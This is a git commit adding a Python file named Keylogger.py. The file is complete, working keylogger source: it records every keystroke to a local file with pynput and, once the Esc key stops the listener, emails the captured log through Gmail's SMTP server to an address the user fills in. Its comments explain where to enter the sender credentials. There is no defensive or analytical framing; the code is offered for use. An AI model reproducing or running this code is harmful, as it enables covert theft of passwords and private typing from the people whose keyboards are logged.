1541b354c5e59c5a31bf2b4a847e8126984c96cb
ROHAN TIWARI <87462011+rohangit-hub@users.noreply.github.com>
2023-01-11 23:45:22 +0530

    Add files via upload

---
+++ Keylogger.py
@@ -0,0 +1,66 @@
+from pynput import keyboard
+import smtplib,ssl
+
+sender_mail = "sender@domain.com"       # Replace sender@domain.com with your email id (everywhere)
+password = "Sender mail password"       # Enter your Password here  
+
+
+receiver_mail = "Reciver@domain.com"    # Replace Reciver@domain.com with your email id (everywhere)
+#prefer using your own email id for receiver's as well.
+
+port = 587
+
+message = """From: sender@domain.com
+To: Reciver@domain.com                        
+Subject: KeyLogs
+
+
+Text: Keylogs 
+"""
+
+def write(text):
+    with open("keylogger.txt",'a') as f:
+        f.write(text)
+        f.close()
+
+
+def on_key_press(Key):
+    try:
+        if(Key == keyboard.Key.enter):
+            write("\n")
+        else:
+            write(Key.char)
+    except AttributeError:
+        if Key == keyboard.Key.backspace:
+            write("\nBackspace Pressed\n")
+        elif(Key == keyboard.Key.tab):
+            write("\nTab Pressed\n")
+        elif(Key == keyboard.Key.space):
+            write(" ")
+        else:
+            temp = repr(Key)+" Pressed.\n"
+            write(temp)
+            print("\n{} Pressed\n".format(Key))
+
+def on_key_release(Key):
+    #This stops the Listener/Keylogger.
+    #You can use any key you like by replacing "esc" with the key of your choice
+    if(Key == keyboard.Key.esc):
+        return False
+
+with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
+    listener.join()
+
+with open("keylogger.txt",'r') as f:
+    temp = f.read()
+    message = message + str(temp)
+    f.close()
+
+
+context = ssl.create_default_context()
+server = smtplib.SMTP('smtp.gmail.com', port)
+server.starttls()
+server.login(sender_mail,password)
+server.sendmail(sender_mail,receiver_mail,message)
+print("Email Sent to ",sender_mail)
+server.quit()
